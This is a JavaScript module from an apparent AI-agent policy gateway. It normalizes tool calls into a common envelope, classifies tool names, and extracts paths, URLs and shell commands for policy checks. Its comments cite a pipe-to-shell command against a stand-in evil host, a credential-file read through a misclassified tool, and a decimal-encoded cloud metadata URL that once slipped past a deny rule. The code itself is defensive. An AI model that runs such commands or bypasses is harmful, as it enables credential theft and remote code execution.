/**
 * Tool-call normalization — the agent-neutral envelope.
 *
 * This is the module that makes Cirvix a control plane rather than an MCP
 * proxy. Every request, whatever spoke it, becomes one shape:
 *
 *   {
 *     request_id: "req_8a91…",
 *     agent:      "claude-code",
 *     tool:       "filesystem.read",
 *     action:     "fs.read",
 *     arguments:  { path: "./src/app.ts" },
 *     resource:   "/abs/path/src/app.ts",
 *     source:     "mcp",
 *     timestamp:  "2026-08-12T…",
 *     risk:       "low"
 *   }
 *
 * After this point nothing downstream knows or cares whether the call arrived
 * over MCP stdio, MCP HTTP, the UDS socket, or `guard.wrap()` inside a LangGraph
 * executor. The policy engine sees one vocabulary; a rule written once governs
 * every agent that will ever connect.
 *
 * TWO NAMES FOR THE SAME THING, ON PURPOSE
 *
 * `tool` is the canonical *public* name — `filesystem.read`, `shell.exec`,
 * `database.write` — which is what people write in policy files and what the
 * console displays. `action` is the terse internal vocabulary the deployed
 * engine already uses — `fs.read`, `shell.exec`, `db.write`.
 *
 * Carrying both is not redundancy. Policy files in the wild are written against
 * `action`, and renaming it would silently break every deployed rule set; the
 * blueprint and the docs are written against `tool`, and a product whose docs
 * do not match its policy syntax is a product nobody can configure. So both are
 * present, `ALIASES` maps every spelling to one canonical pair, and a rule
 * matching either form matches the same calls.
 */

import { classify } from "./risk.mjs";
import { canonicalizeResource } from "./policy.mjs";
import { canonicalHost, canonicalUrl } from "./canonical.mjs";

/* -------------------------------------------------------------------------- */
/*  Taxonomy                                                                   */
/* -------------------------------------------------------------------------- */

/**
 * The canonical tool namespace.
 *
 * `tool` is the public name; `action` is what the engine matches on. Ordered
 * most-specific first — `git.status` must be recognised before a generic
 * `*.status` would catch it.
 */
export const TAXONOMY = [
  // Version control — read-only, the LOW baseline.
  { tool: "git.status", action: "vcs.read", match: /^git[._ -]?(status|st)$/i },
  { tool: "git.log", action: "vcs.read", match: /^git[._ -]?(log|history)$/i },
  { tool: "git.diff", action: "vcs.read", match: /^git[._ -]?(diff|show)$/i },
  { tool: "git.branch", action: "vcs.write", match: /^git[._ -]?(branch|checkout|switch)$/i },
  { tool: "git.commit", action: "vcs.write", match: /^git[._ -]?commit$/i },
  { tool: "git.push", action: "vcs.push", match: /^git[._ -]?push$/i },

  // Filesystem.
  { tool: "filesystem.read", action: "fs.read", match: /(^|[._-])(read|cat|open|load|slurp)([._-]|$)/i },
  { tool: "filesystem.list", action: "fs.list", match: /(^|[._-])(list|ls|dir|readdir|tree|glob)([._-]|$)/i },
  { tool: "filesystem.search", action: "fs.search", match: /(^|[._-])(search|find|grep|rg|ripgrep)([._-]|$)/i },
  { tool: "filesystem.stat", action: "fs.stat", match: /(^|[._-])(stat|exists|metadata)([._-]|$)/i },
  { tool: "filesystem.write", action: "fs.write", match: /(^|[._-])(write|create|put|save|edit|patch|append|touch|mkdir)([._-]|$)/i },
  { tool: "filesystem.delete", action: "fs.delete", match: /(^|[._-])(delete|remove|rm|unlink|rmdir)([._-]|$)/i },
  { tool: "filesystem.move", action: "fs.move", match: /(^|[._-])(move|mv|rename|copy|cp)([._-]|$)/i },

  // Execution.
  { tool: "shell.exec", action: "shell.exec", match: /(^|[._-])(exec|execute|run|shell|bash|sh|zsh|powershell|cmd|command|spawn|terminal)([._-]|$)/i },
  { tool: "package.install", action: "pkg.install", match: /(^|[._-])(install|add[-_]?dependency|npm[-_]?install|pip[-_]?install)([._-]|$)/i },

  // Data.
  { tool: "database.query", action: "db.read", match: /(^|[._-])(query|select|find[-_]?one|find[-_]?many|fetch[-_]?rows)([._-]|$)/i },
  { tool: "database.write", action: "db.write", match: /(^|[._-])(insert|update|upsert|delete[-_]?row|execute[-_]?sql|mutate)([._-]|$)/i },
  { tool: "database.migrate", action: "db.migrate", match: /(^|[._-])(migrate|migration|schema[-_]?change)([._-]|$)/i },

  // Network.
  { tool: "network.request", action: "http.request", match: /(^|[._-])(request|http|https|fetch|curl|get[-_]?url|post|browse|scrape|crawl|web[-_]?search)([._-]|$)/i },

  // Infrastructure.
  { tool: "deploy.apply", action: "k8s.apply", match: /(^|[._-])(apply|deploy|rollout|release|promote|helm|terraform)([._-]|$)/i },

  // Credentials.
  { tool: "secrets.get", action: "secrets.read", match: /(^|[._-])(secret|credential|token|password|vault|keychain)([._-]|$)/i },
];

/**
 * Spellings that mean the same action.
 *
 * Consulted when a policy rule names an action, so `filesystem.read` and
 * `fs.read` are one rule and neither breaks. Bidirectional by construction: the
 * canonical form maps to itself.
 */
export const ALIASES = new Map();
for (const entry of TAXONOMY) {
  ALIASES.set(entry.tool, entry.action);
  ALIASES.set(entry.action, entry.action);
}
// Spellings people write that are not a taxonomy entry's primary name.
for (const [alias, action] of Object.entries({
  "fs.*": "fs.*",
  "file.read": "fs.read",
  "file.write": "fs.write",
  "files.read": "fs.read",
  "filesystem.*": "fs.*",
  "network.*": "http.*",
  "net.request": "http.request",
  "http.get": "http.request",
  "http.post": "http.request",
  "shell.run": "shell.exec",
  "process.spawn": "shell.exec",
  "command.execute": "shell.exec",
  "db.*": "db.*",
  "database.*": "db.*",
  "sql.execute": "db.write",
  "k8s.deploy": "k8s.apply",
  "kubernetes.apply": "k8s.apply",
})) {
  ALIASES.set(alias, action);
}

/** Resolves any spelling of an action to its canonical form. */
export function canonicalAction(name) {
  if (typeof name !== "string" || !name) return name;
  const direct = ALIASES.get(name);
  if (direct) return direct;
  // `filesystem.**` → `fs.**`, so glob patterns alias too.
  const prefixed = name.replace(/^(filesystem|file|files)\./, "fs.").replace(/^(network|net)\./, "http.").replace(/^database\./, "db.");
  return ALIASES.get(prefixed) ?? prefixed;
}

/** The public name for a canonical action, for display. */
export function publicToolName(action) {
  const entry = TAXONOMY.find((t) => t.action === action);
  return entry?.tool ?? action;
}

/**
 * Classifies a raw tool name into `{ tool, action }`.
 *
 * An unrecognised name is NOT forced into the nearest bucket. It keeps its own
 * namespaced identity (`mcp.<server>.<tool>`) and policy must name it
 * explicitly. Guessing here would be the worst possible failure: a tool that
 * deletes production data, misfiled as `fs.read` because it was called `getRid`,
 * would inherit a read rule's permission.
 */
/**
 * Names that say "this operates on a file", whatever verb they use.
 *
 * Checked before the suffix patterns because the verb alone is ambiguous and
 * the ambiguity is dangerous in one specific direction: `fetch_file` matched
 * `network.request` (which contains `fetch`) and was therefore governed by the
 * egress rules instead of the filesystem ones — so a tool named `fetch_file`
 * could read `~/.aws/credentials` while every credential rule in the policy
 * looked on. `get_file`, `load_file`, and `file_get_contents` had the same
 * shape. The generated corpus found all four.
 *
 * A name that mentions a file is a filesystem operation. The verb then decides
 * which one.
 */
const FILE_SUBJECT = /(^|[._-])(file|files|filepath|path|dir|directory|folder)([._-]|s?$)/i;

/**
 * Names that say "this goes over the network", whatever else they contain.
 *
 * Checked before the taxonomy for the same reason `FILE_SUBJECT` is, and
 * because of a symmetric failure: `web_search` matched `filesystem.search`
 * (which owns the `search` suffix and is listed earlier), so a web search was
 * governed by the workspace-path rules and default-denied. `browser_fetch`,
 * `http_get`, and `url_open` had the same shape.
 *
 * The subject wins over the verb: a name that says `web`, `url`, `http`, or
 * `browser` is a network call regardless of what it does there.
 */
const NETWORK_SUBJECT = /(^|[._-])(web|url|uri|http|https|browser|internet|remote|api)([._-]|$)/i;

/**
 * Splits camelCase into the underscore form the patterns are written against.
 *
 * `readFile` matched nothing at all: the `filesystem.read` pattern needs a
 * separator or end-of-string after `read`, and camelCase provides neither, so
 * the tool fell through to `tool.readFile` and was default-denied. `readFile`
 * is one of the most common MCP tool names in existence, so this was not an
 * edge case — the generated corpus surfaced 135 false positives from it.
 *
 * Applied only for matching. The recorded `raw_tool` keeps the original
 * spelling, because the audit record must say what the agent actually called.
 */
export function splitCamelCase(name) {
  return String(name ?? "")
    .replace(/([a-z0-9])([A-Z])/g, "$1_$2")
    .replace(/([A-Z]+)([A-Z][a-z])/g, "$1_$2")
    .toLowerCase();
}

/** Verbs, once the subject is known to be a file. */
const FILE_VERBS = [
  { action: "fs.delete", match: /(^|[._-])(delete|remove|rm|unlink|destroy)([._-]|$)/i },
  { action: "fs.write", match: /(^|[._-])(write|create|put|save|edit|patch|append|touch|mkdir|upload)([._-]|$)/i },
  { action: "fs.move", match: /(^|[._-])(move|mv|rename|copy|cp)([._-]|$)/i },
  { action: "fs.list", match: /(^|[._-])(list|ls|dir|readdir|tree|glob)([._-]|$)/i },
  { action: "fs.search", match: /(^|[._-])(search|find|grep|rg)([._-]|$)/i },
  { action: "fs.stat", match: /(^|[._-])(stat|exists|metadata|info)([._-]|$)/i },
  // Read last: it is the fallback for anything that names a file and does not
  // say it is changing it. Erring toward "read" is right here — the read rules
  // are the strict ones, so a misfile lands on the safer side.
  { action: "fs.read", match: /.*/ },
];

export function classifyTool(name, server = null) {
  const raw = String(name ?? "");

  // An exact canonical name short-circuits the regexes.
  //
  // Not an optimization — a correctness fix. The suffix patterns are matched in
  // order, and `database.write` hit `filesystem.write`'s `(write)$` rule first,
  // so a call already named with the canonical database action was governed by
  // filesystem rules. Anything that already spells a taxonomy name means that
  // name, and no amount of pattern reordering makes that safe to infer twice.
  const exact = TAXONOMY.find((t) => t.tool === raw || t.action === raw);
  if (exact) return { tool: exact.tool, action: exact.action };

  const aliased = ALIASES.get(raw);
  if (aliased) {
    const entry = TAXONOMY.find((t) => t.action === aliased);
    if (entry) return { tool: entry.tool, action: entry.action };
  }

  /*
   * Everything below matches against the camelCase-split form.
   *
   * The patterns are written with `[._-]` separators, so `readFile` matched
   * none of them and was default-denied. Splitting first means `readFile`,
   * `read_file`, and `read-file` are one tool.
   */
  const spelled = splitCamelCase(raw);

  // A name that says network is a network call, whatever verb it uses. First,
  // because `web_search` would otherwise be claimed by `filesystem.search`.
  if (NETWORK_SUBJECT.test(spelled)) {
    const entry = TAXONOMY.find((t) => t.action === "http.request");
    if (entry) return { tool: entry.tool, action: entry.action };
  }

  // A name that says "file" is a filesystem operation, whatever verb it uses.
  // This runs before the suffix patterns so `fetch_file` cannot be captured by
  // `network.request` — see FILE_SUBJECT.
  if (FILE_SUBJECT.test(spelled)) {
    const verb = FILE_VERBS.find((v) => v.match.test(spelled));
    const entry = TAXONOMY.find((t) => t.action === verb.action);
    if (entry) return { tool: entry.tool, action: entry.action };
  }

  for (const entry of TAXONOMY) {
    if (entry.match.test(spelled)) return { tool: entry.tool, action: entry.action };
  }

  const fallback = server ? `mcp.${server}.${raw}` : `tool.${raw}`;
  return { tool: fallback, action: fallback };
}

/* -------------------------------------------------------------------------- */
/*  Request ids                                                                */
/* -------------------------------------------------------------------------- */

let counter = 0;

/**
 * A short, sortable, collision-resistant id.
 *
 * Time-prefixed so ids sort chronologically in a log tail, which is how they
 * are actually read. The counter disambiguates calls inside the same
 * millisecond — a busy agent makes several, and two records sharing an id makes
 * `cirvix replay` ambiguous.
 */
export function requestId(prefix = "req") {
  counter = (counter + 1) % 0xffff;
  const t = Date.now().toString(36).padStart(9, "0");
  const n = counter.toString(36).padStart(3, "0");
  return `${prefix}_${t}${n}`;
}

/* -------------------------------------------------------------------------- */
/*  Normalization                                                              */
/* -------------------------------------------------------------------------- */

/** Where a call entered the runtime. */
export const SOURCE = {
  MCP: "mcp",
  MCP_HTTP: "mcp-http",
  UDS: "uds",
  SDK: "sdk",
  CLI: "cli",
  REPLAY: "replay",
};

/** Argument keys that name the thing a call acts on, most specific first. */
const RESOURCE_KEYS = [
  "path",
  "file",
  "filename",
  "filepath",
  "file_path",
  "absolute_path",
  "uri",
  "url",
  "endpoint",
  "resource",
  "target",
  "destination",
  "table",
  "collection",
  "query",
  "sql",
];

/**
 * Extracts the resource a call targets.
 *
 * Best-effort by design: an unrecognised shape yields the empty string so the
 * call is still evaluated rather than skipped. A call whose resource cannot be
 * read is not a call that gets a free pass — it just gets evaluated against the
 * rules that do not name a resource, and default-deny catches the rest.
 */
/**
 * Keys that hold a command, never a resource.
 *
 * Excluded from the fallback scan below. Without this, `{ command: "curl x | sh" }`
 * had no resource key, fell through to "first string value", and the command
 * was canonicalized as a filesystem path — producing a resource like
 * `<cwd>/curl https:/evil.sh | sh`, which is not a path, appears in the audit
 * record as though it were, and would be matched against path rules.
 */
const COMMAND_KEYS = new Set(["command", "cmd", "script", "shell", "exec", "run", "args", "argv", "body", "content", "text", "prompt"]);

export function extractResource(args) {
  if (!args || typeof args !== "object") return "";
  for (const key of RESOURCE_KEYS) {
    const v = args[key];
    if (typeof v === "string" && v.length) return v;
  }
  const fallback = Object.entries(args).find(
    ([k, v]) => !COMMAND_KEYS.has(k) && typeof v === "string" && v.length,
  );
  return fallback ? fallback[1] : "";
}

/**
 * The endpoint a call will reach, or null. Only an absolute http(s) URL counts.
 *
 * Returns the CANONICAL form. A destination rule is matched as a string, so
 * handing it the raw URL meant `deny: network.destination = 169.254.169.254`
 * did not match `http://2852039166/latest/meta-data/` — the same address in
 * decimal, which every HTTP client dials identically. The risk engine already
 * caught those, because it read the host through the URL parser; the policy did
 * not, and the policy is what blocks.
 */
export function extractDestination(args, resource) {
  for (const candidate of [args?.url, args?.uri, args?.endpoint, args?.href, resource]) {
    if (typeof candidate === "string" && /^https?:\/\//i.test(candidate)) {
      return canonicalUrl(candidate) ?? candidate;
    }
  }
  return null;
}

/** The shell command a call carries, flattened from whichever shape it used. */
export function extractCommand(args) {
  if (!args || typeof args !== "object") return null;
  for (const key of ["command", "cmd", "script", "shell", "exec", "run", "args"]) {
    const v = args[key];
    if (typeof v === "string" && v) return v;
    if (Array.isArray(v) && v.length && v.every((x) => typeof x === "string")) return v.join(" ");
  }
  return null;
}

/**
 * Normalizes one raw tool call into the envelope every downstream stage reads.
 *
 * @param {object} raw
 * @param {string} raw.tool               the tool name as the caller spelled it
 * @param {string|null} [raw.server]      MCP server, when there is one
 * @param {object} [raw.arguments]
 * @param {object} [ctx]
 * @param {string} [ctx.agent]
 * @param {string} [ctx.source]
 * @param {string} [ctx.cwd]
 * @param {string} [ctx.environment]
 * @param {boolean} [ctx.touchedSecret]
 * @param {number} [ctx.secretsDetected]
 * @param {string} [ctx.runId]
 * @param {string} [ctx.timestamp]        injected for reproducible tests
 * @returns {object} the normalized call, including its risk classification
 */
export function normalize(raw, ctx = {}) {
  const args = raw.arguments ?? raw.args ?? {};
  const server = raw.server ?? null;
  const { tool, action } = classifyTool(raw.tool, server);

  const cwd = ctx.cwd ?? process.cwd();
  const rawResource = extractResource(args);
  const resource = rawResource ? canonicalizeResource(rawResource, cwd) : "";
  const destination = extractDestination(args, rawResource);
  const command = extractCommand(args);

  const insideWorkspace = isInsideWorkspace(cwd, resource);
  const egress = classifyEgress(destination ?? rawResource);

  const call = {
    request_id: raw.request_id ?? requestId(),
    run_id: ctx.runId ?? null,
    agent: ctx.agent ?? "unknown",
    source: ctx.source ?? SOURCE.MCP,
    timestamp: ctx.timestamp ?? new Date().toISOString(),

    // Identity of the call.
    tool,
    action,
    server,
    raw_tool: String(raw.tool ?? ""),

    // What it acts on.
    arguments: args,
    resource,
    raw_resource: rawResource,
    destination,
    command,
    sql: typeof args.sql === "string" ? args.sql : typeof args.query === "string" ? args.query : null,

    // Environment the decision depends on.
    environment: ctx.environment ?? "local",
    insideWorkspace,
    egress,
    touchedSecret: Boolean(ctx.touchedSecret),
    secretsDetected: ctx.secretsDetected ?? 0,
  };

  const risk = classify(call);
  call.risk = risk.level;
  call.risk_signals = risk.signals.map((s) => s.id);
  call.risk_reason = risk.reason;

  return call;
}

/**
 * The context object the policy engine reads conditions against.
 *
 * Built from a normalized call so the two can never disagree about, say,
 * whether a path was inside the workspace. A second implementation of this
 * mapping is a second policy.
 */
export function policyContext(call) {
  return {
    environment: call.environment,
    path: { insideWorkspace: call.insideWorkspace },
    egress: {
      external: call.egress === "external",
      internal: call.egress === "internal",
      allowlisted: Boolean(call.allowlisted),
      destination: call.destination,
    },
    session: { touchedSecret: call.touchedSecret },
    mcp: { server: call.server, tool: call.raw_tool },
    risk: call.risk,
    tool: call.tool,
    command: call.command,
    secrets: { detected: call.secretsDetected },
  };
}

/** The policy request for a normalized call. */
export function policyRequest(call) {
  return {
    agent: call.agent,
    action: call.action,
    resource: call.resource,
    context: policyContext(call),
  };
}

/* -------------------------------------------------------------------------- */

function isInsideWorkspace(cwd, resource) {
  if (!resource) return true;
  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(resource)) return false;
  const norm = (s) => String(s).replace(/\\/g, "/").replace(/\/+$/, "").toLowerCase();
  const abs = /^([A-Za-z]:|\/)/.test(resource) ? resource : `${cwd}/${resource}`;
  const parts = [];
  for (const seg of norm(abs).split("/")) {
    if (seg === "..") parts.pop();
    else if (seg !== ".") parts.push(seg);
  }
  const flat = parts.join("/");
  const root = norm(cwd);
  return flat === root || flat.startsWith(root + "/");
}

function classifyEgress(target) {
  if (typeof target !== "string" || !/^https?:\/\//i.test(target)) return "none";
  let host;
  try {
    host = new URL(target).hostname.toLowerCase();
  } catch {
    return "external";
  }
  if (/^(localhost|127\.|0\.0\.0\.0|::1)/.test(host)) return "none";
  if (/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.)/.test(host)) return "internal";
  if (/\.(internal|local|localdomain|test|invalid)$/.test(host)) return "internal";
  return "external";
}
